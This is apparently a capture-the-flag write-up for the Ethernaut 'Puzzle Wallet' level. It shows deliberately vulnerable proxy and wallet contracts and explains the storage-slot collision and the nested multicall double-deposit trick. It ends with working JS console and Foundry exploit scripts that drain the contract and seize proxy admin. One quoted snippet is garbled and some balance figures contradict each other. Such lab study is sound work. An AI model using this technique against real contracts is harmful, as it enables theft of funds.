![](https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg)

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

  Things that might help:

- Understanding how `delegatecall` works and how `msg.sender` and `msg.value` behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

Solution:
## Analysis

This level consists of two contracts, a Proxy contract called PuzzleProxy and the logic/implementation contract called PuzzleWallet. So what is a proxy and implementation contract you ask? It's time to learn about upgradeable contracts.
### Upgradeable Contracts

Every transaction we do on Ethereum is immutable and can not be modified or updated. This is the advantage that makes the network secure and helps anyone on the network to verify and validate the transactions. Due to this limitation, developers face issues when updating their contract's code as it can not be modified once deployed on the blockchain.

To overcome this situation, upgradeable contracts were introduced. This deployment pattern consists of two contracts - A Proxy contract (Storage layer) and an Implementation contract (Logic layer).

In this architecture, the user interacts with the logic contract via the proxy contract and when there's a need to update the logic contract's code, the logic contract's address is updated in the proxy contract which allows the users to interact with the new logic contract.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662656819138/ZshcJZhkW.png?auto=compress,format&format=webp)

There's something that should be noted when implementing an upgradeable pattern, the slot arrangement in both the contracts should be the same because the slots are mapped. It means that when the proxy contract makes a call to the implementation contract, the proxy's storage variables are modified and the call is made in the context of the proxy. This is where our exploitation starts.

---
## Contract Analysis

Let's take a look at the slot arrangement in both the contracts:

|Slot #|PuzzleProxy|PuzzleWallet|
|---|---|---|
|0|pendingAdmin|owner|
|1|admin|maxBalance|

Since we need to become the admin of the proxy, we need to overwrite the value in slot 1, i.e., either the `admin` or the `maxBalance` variable.

There are two functions that are modifying the value of `maxBalance`. They are:

```sol
function init(uint256 _maxBalance) public {
    require(maxBalance == 0, "Already initialized");
    maxBalance = _maxBalance;
    owner = msg.sender;
}
...
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
}
```

The `init()` function is making sure that the `maxBalance` is already 0 and then only allowing us to go through. This is impossible, so we'll look at the other function `setMaxBalance()`.

The function `setMaxBalance()` is only checking if the contract's balance is 0. Maybe we can somehow influence this?

```sol
function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
}
```

This function `setMaxBalance()` is also making sure that our user is whitelisted using a modifier `onlyWhitelisted` and to be whitelisted, we will be calling a function `addToWhitelist()` with our wallet's address but there's a validation happening in here that checks if our `msg.sender` is the `owner`.

To become the owner, we need to write into slot 0, i.e., either `owner` or `pendingAdmin`. From the contract PuzzleProxy, we can see that the function `proposeNewAdmin()` is external and is setting the value for `pendingAdmin`. Since the slots are replicated, if we call this function, we will automatically become the owner of the PuzzleWallet contract because both the variables are stored in slot 0 of the contracts.

Let us now look at the function influencing the contract's balance and allowing us to drain the balance.

```sol
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] = balances[msg.sender].sub(value);
    (bool success, ) = to.call{ value: value }(data);
    require(success, "Execution failed");
}
```

The `execute()` function is the only one that is making a `call()` to the address `to` with some `value` but this has a validation that checks that the `msg.sender` has sufficient balance to call the function. So how do we exploit this function?

We have to manipulate the contract into thinking that we have more balance than what we actually do. If we can do that, we will be able to call the `execute()` function with a value for balance that is equal to or more than the contract's balance and this will allow us to withdraw all the balance from the contract.

Now we have to look for any function which is manipulating our balance values. We see the `deposit()` function is allowing a user to deposit some amount into the contract and also adding the deposited amount into our `balances` mapping. But, if we call the `deposit()` normally, it will add the balance in both places (balances mapping and the contract). To exploit this function, we need to send Ether only once but increase value in our balances mapping twice. So how do we do that?

Now comes a function called `multicall()`. This function basically does what its name says. It allows you to call a function multiple times in a single transaction, saving some gas. Let's study its code:

```sol
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(  , 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

Maybe we can make use of this function to call `deposit()` multiple times in a single transaction therefore we will be supplying Ether only once but our balances might increase in multiples. But wait! There's another validation in here.

There's a flag called `depositCalled` which is set to false initially. The function is extracting the function selector from the data passed to it and checking if it is `deposit()` and changing the value of the flag `depositCalled`. This is essentially preventing `deposit()` from being called multiple times through `multicall()`. We need to bypass this.

The contract's current balance is 0.001. We can check using `await getBalance(instance)` from the console.

If we are able to call `deposit()` twice with 0.001 Ether in the same transaction, it'll mean that we are supplying 0.001 Ether only once and our player's balance (`balances[player]`) will go from 0 to 0.002 but in actuality, since we did it in the same transaction, our deposited amount will still be 0.001.

Therefore, the total balance of the contract now will still be 0.002, but due to the accounting error in `balances`, it'll think that it's 0.003 Ether. This will allow our player to call the `execute()` function because the statement `require(balances[msg.sender] >= value) = (require(0.003 >= 0.002)` will result in a success if we supply 0.002 Ether as `value` which will drain the contract.

What if, instead of calling `deposit()` directly with `multicall()`, we call two multicalls and within each `multicall()`, we call one `deposit()` (since the function `multicall()` takes an array)?

This won't affect the `depositCalled` since each `multicall()` will check their own `depositCalled` bool values.

Once we do this, we should be able to call the `execute()` to drain the contract and after that we should be able to call `setMaxBalance()` to set the value of `maxBalance` on slot 1, and therefore, setting the value for the proxy admin.

Phew! That was a long explanation. Let's write our theory into solidity code.

Exploit via js console:
```js
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}

params = [player]

data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

await web3.eth.sendTransaction({from: player, to: instance, data})
```
```js
await contract.addToWhitelist(player)
```
```js
// deposit() method
depositData = await contract.methods["deposit()"].request().then(v => v.data)

// multicall() method with param of deposit function call signature
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```
```js
await contract.execute(player, toWei('0.002'), 0x0)
```
```js
await contract.setMaxBalance(player)
```

Exploit via foundry script:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "../instances/Ilevel24.sol";

contract POC is Script {

    PuzzleWallet wallet = PuzzleWallet(<instance addr>);
    PuzzleProxy px = PuzzleProxy(<instance addr>);

    function run() external{
        vm.startBroadcast();

        //creating encoded function data to pass into multicall
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

        // making ourselves owner of wallet
        px.proposeNewAdmin(msg.sender);
        //whitelisting our address
        wallet.addToWhitelist(msg.sender);
        //calling multicall with nested data stored above
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");
        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(msg.sender));
        //making sure our exploit worked
        console.log("New Admin is : ", px.admin());

        vm.stopBroadcast();
    }
}
```